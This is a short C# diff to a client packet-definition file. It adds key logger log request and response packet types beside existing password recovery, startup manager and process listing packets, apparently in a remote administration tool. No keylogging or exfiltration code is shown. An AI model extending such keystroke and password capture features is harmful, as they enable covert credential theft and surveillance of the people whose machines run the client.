@@ -16,7 +16,8 @@ namespace Client.Packets
         GetProcesses, GetProcessesResponse, // Task Manager
         GetSysInfo, GetSysInfoResponse, // System Information
         GetStartupItems, GetStartupItemsResponse, DoStartupItemAdd, DoStartupItemRemove, // Startup Manager
-        GetPasswords, GetPasswordsResponse // Password Recovery
+        GetPasswords, GetPasswordsResponse, // Password Recovery
+        GetKeyLoggerLogs, GetKeyLoggerLogsResponse // Key Logger
     }
 
     [Union(typeof(SetStatus), // Set Status
@@ -29,7 +30,8 @@ namespace Client.Packets
         typeof(GetProcesses), typeof(GetProcessesResponse), // Task Manager
         typeof(GetSysInfo), typeof(GetSysInfoResponse), // System Information
         typeof(GetStartupItems), typeof(GetStartupItemsResponse), typeof(DoStartupItemAdd), typeof(DoStartupItemRemove), // Startup Manager
-        typeof(GetPasswords), typeof(GetPasswordsResponse))] // Password Recovery
+        typeof(GetPasswords), typeof(GetPasswordsResponse), // Password Recovery
+        typeof(GetKeyLoggerLogs), typeof(GetKeyLoggerLogsResponse))] // Key Logger
 
     public abstract class IPackets
     {
